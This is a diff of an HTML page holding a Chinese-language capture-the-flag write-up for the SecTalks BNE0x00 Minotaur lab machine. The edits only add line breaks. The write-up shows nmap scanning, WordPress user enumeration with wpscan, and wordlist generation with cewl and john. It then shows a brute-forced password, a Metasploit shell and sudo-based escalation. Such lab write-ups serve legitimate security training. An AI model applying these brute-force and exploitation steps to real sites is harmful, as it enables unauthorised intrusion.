@@ -7543,23 +7543,23 @@
   <h1>SecTalks BNE0x00 Minotaur</h1>
 
 <h2 id="sectalks-bne0x00-minotaur">SecTalks: BNE0x00 - Minotaur</h2>
-<p>按照之前的方法，但是这里是 dhcp 被注释掉了
+<p>按照之前的方法，但是这里是 dhcp 被注释掉了<br />
 把那些白的删掉，箭头指向的那一行的注释去掉</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598232357045-39093f63-8151-4005-a4eb-c75871a6aa8b-740058.png" /></p>
 <p>nmap -p- -A 192.168.149.196</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598232656467-db97e017-3f88-4ec6-8d18-5ae6bc6e52d2-092276.png" /></p>
 <p>ftp 匿名登录进去啥都没有</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598245608281-6e821708-f8e2-491b-a154-3eff02dcb725-651414.png" /></p>
-<p>80 端口有个 apache 的默认页面
-然后扫描目录扫出来一个 bull，访问是一个 wordpress 的博客，扫描一波，出来个用户名 bully
+<p>80 端口有个 apache 的默认页面<br />
+然后扫描目录扫出来一个 bull，访问是一个 wordpress 的博客，扫描一波，出来个用户名 bully<br />
 <code>wpscan --url http://192.168.149.196/bull/ -eu</code></p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598248683445-ccf69c43-e02a-4760-b8b8-bae7d86805bd-471953.png" /></p>
-<p>然后爆破一下（字典用 cewl 获取页面上的内容）
-<code>cewl -w words.txt -m 6 http://192.168.149.196/bull/</code>
--m 这个参数指定的是长度
-<code>john --wordlist=words.txt --rules --stdout &gt; words-john.txt</code>
+<p>然后爆破一下（字典用 cewl 获取页面上的内容）<br />
+<code>cewl -w words.txt -m 6 http://192.168.149.196/bull/</code><br />
+-m 这个参数指定的是长度<br />
+<code>john --wordlist=words.txt --rules --stdout &gt; words-john.txt</code><br />
 john 处理一下，生成一些组合出来的</p>
-<p><code>wpscan --url http://192.168.149.196/bull/ --passwords ./words-john.txt -U bully</code>
+<p><code>wpscan --url http://192.168.149.196/bull/ --passwords ./words-john.txt -U bully</code><br />
 然后用组合出来的字典跑出来 bully 账户密码为 Bighornedbulls</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598275288484-7e0c92d7-079b-4bf2-a3dd-08f4277c6c1c-403426.png" /></p>
 <p>然后可以用 msf 直接来拿 shell</p>
@@ -7577,7 +7577,7 @@ set WP_PASSWORD Bighornedbulls
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598277506386-c7502414-6159-4a15-88df-9b2feb31b00c-010424.png" /></p>
 <p>切换用户 heffer 在用户目录得到一个 flag</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598277610850-a88a5204-8d58-4f35-a321-e492175ceb7e-529220.png" /></p>
-<p>切换 minotaur 同样在用户目录得到一个 flag
+<p>切换 minotaur 同样在用户目录得到一个 flag<br />
 用 sudo -l 查看一下发现可以用 sudo 执行任意的命令？</p>
 <p><img alt="image.png" src="../img/zpzJnRJ1JlcHybe4/1598277829618-ed8c7820-6fef-423a-9e63-3945b7c384d1-702479.png" /></p>
 <blockquote>
